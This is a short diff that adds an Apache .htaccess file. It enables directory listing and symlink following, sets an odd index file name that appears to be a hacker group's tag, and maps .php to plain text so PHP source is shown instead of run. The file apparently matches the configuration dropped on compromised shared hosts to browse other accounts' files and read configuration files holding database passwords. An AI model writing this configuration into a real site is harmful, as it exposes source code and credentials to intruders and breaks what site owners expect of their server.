@@ -1,0 +1,4 @@
+Options Indexes FollowSymLinks
+DirectoryIndex azzatssins.cyberserkers
+AddType txt .php
+AddHandler txt .php
